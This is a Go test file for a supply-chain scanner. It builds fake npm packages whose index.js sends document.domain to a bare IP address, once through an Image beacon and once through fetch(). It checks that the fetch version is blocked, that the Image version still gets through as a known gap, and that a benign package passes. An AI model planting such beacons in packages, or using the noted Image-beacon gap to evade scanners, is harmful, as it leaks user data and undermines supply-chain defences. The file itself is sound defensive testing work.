package cli

import "testing"

// helpersutils-dev-tools (row 56), guard side: same iocscan.Scan as the
// server. The documented `new Image()` beacon is not refused; a fetch()
// beacon to the same bare IP is.
func TestAttack2026_56_HelpersutilsDevTools_Guard(t *testing.T) {
	pj := `{"name":"helpersutils-dev-tools","version":"1.0.11","main":"index.js"}`
	img := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": pj,
		"index.js":     "(function(){var i=new Image();i.src='http://5.189.173.113:8899/csp-edu?d='+document.domain;})();\n",
	}))
	if img.Block {
		t.Fatalf("Image beacon now refused — update the finding: %+v", img)
	}
	f := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": pj,
		"index.js":     "(function(){fetch('http://5.189.173.113:8899/csp-edu?d='+document.domain);})();\n",
	}))
	if !f.Block {
		t.Fatalf("fetch beacon to a bare public IP not refused: %+v", f)
	}
	clean := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": pj, "index.js": "module.exports={noop(){}};\n",
	}))
	if clean.Block {
		t.Fatalf("benign helpers refused: %+v", clean)
	}
}
